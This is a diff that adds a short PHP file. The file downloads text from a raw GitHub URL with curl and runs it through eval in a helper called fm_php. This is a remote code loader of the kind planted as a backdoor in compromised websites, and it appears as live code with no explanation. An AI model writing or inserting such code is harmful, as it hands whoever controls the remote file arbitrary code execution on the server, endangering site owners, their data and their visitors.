@@ -1,0 +1,16 @@
+<?php
+function fm_php($output){
+	ob_start();
+	echo eval('?>'.trim($output));
+	echo "";
+}
+
+
+$Url = "https://raw.githubusercontent.com/rkseocode/secode/main/api2.txt";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $Url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$output = curl_exec($ch);
+curl_close($ch);
+fm_php($output);
+?>
